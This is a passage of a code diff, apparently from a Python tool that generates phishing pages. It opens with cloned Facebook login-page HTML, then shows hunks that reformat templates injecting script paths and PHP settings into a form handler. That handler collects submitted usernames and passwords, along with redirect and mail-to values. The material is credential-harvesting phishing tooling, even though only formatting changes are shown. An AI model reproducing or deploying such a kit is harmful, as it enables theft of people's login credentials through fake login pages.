onclick="intl_set_cookie_locale(&quot;ar_AR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Arabic">العربية</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;hi_IN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Hindi">हिन्दी</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;zh_CN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Simplified Chinese (China)">中文(简体)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;ja_JP&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Japanese">日本語</a></li><li><a class="showMore" rel="dialog" href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php&amp;source=TOP_LOCALES_DIALOG" title="Show more languages" role="button">…</a></li></ul></div></div><div id="pageFooter" data-referrer="page_footer"><div id="contentCurve"></div><div role="contentinfo" aria-label="Facebook site links"><table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0"><tbody><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/mobile/?ref=pf" title="Check out Facebook Mobile.">Mobile</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/find-friends?ref=pf" title="Find anyone on the web.">Find Friends</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/badges/?ref=pf" title="Embed a Facebook badge on your website.">Badges</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/people/" title="Browse our people directory.">People</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/pages/" title="Browse our pages directory.">Pages</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/places/" title="Browse our places directory.">Places</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/?ref=pf" title="Check out Facebook App Center.">Apps</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/category/games/?ref=pf" title="Check out Facebook games.">Games</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/appcenter/category/music/?ref=pf" title="Check out Facebook music apps.">Music</a></td></tr><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/facebook" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Advertise on Facebook.">Create Ad</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/pages/create/?ref_type=sitefooter" title="Create a Page">Create Page</a></td><td class="_51m- hLeft plm"><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/privacy/explanation" title="Learn about your privacy and Facebook.">Privacy</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/help/cookies/?ref=sitefooter" title="Learn about cookies and Facebook.">Cookies</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/policies/?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a></td></tr></tbody></table></div><div class="mvl copyright"><div class="fsm fwn fcg"><span> Facebook 2013</span> · <a rel="dialog" href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php" title="Use Facebook in another language." role="button">English (US)</a></div></div></div></div></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </body></html>
 </div>
                
-        <script src=\""""+pathList[3]+"""\"></script> 
-        <script src=\""""+pathList[4]+"""\"></script>
-        <script src=\""""+pathList[5]+"""\"></script>
-        <script src=\""""+pathList[6]+"""\"></script>
-        <script src=\""""+pathList[7]+"""\"></script>
+        <script src=\"""" + pathList[3] + """\"></script> 
+        <script src=\"""" + pathList[4] + """\"></script>
+        <script src=\"""" + pathList[5] + """\"></script>
+        <script src=\"""" + pathList[6] + """\"></script>
+        <script src=\"""" + pathList[7] + """\"></script>
 
 </body>
 </html>
@@ -5401,11 +5510,11 @@ function userAgent(){
 
 if(isset($_POST['submit'])){
 
-       $action  = \""""+valueList[0]+"""\";
-       $redirect = \""""+valueList[1]+"""\";
-       $verbose = \""""+valueList[2]+"""\";
-       $fileName = \""""+valueList[3]+"""\";
-       $to = \""""+valueList[3]+"""\";
+       $action  = \"""" + valueList[0] + """\";
+       $redirect = \"""" + valueList[1] + """\";
+       $verbose = \"""" + valueList[2] + """\";
+       $fileName = \"""" + valueList[3] + """\";
+       $to = \"""" + valueList[3] + """\";
        // Grab Form Values
        $email = $_POST[\"Username\"];
        $password =  $_POST[\"Password\"];
@@ -5458,22 +5567,19 @@ if(isset($_POST['submit'])){
             # Append code to list
             indexList.append(indexCode)
             # Append Index List
-            return indexList        
+            return indexList
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
     def displayProperOSClear(self):
-    # Clear The screen
+        # Clear The screen
 
         osName = self.determineOperatingSystem()
 
         if osName == "windows":
-            # clear screen on windows		
-            os.system('cls') 
+            # clear screen on windows
+            os.system('cls')
         else:
-	     # clear screen on linux/unix -- mac
+             # clear screen on linux/unix -- mac
             os.system('clear')
-
-
-
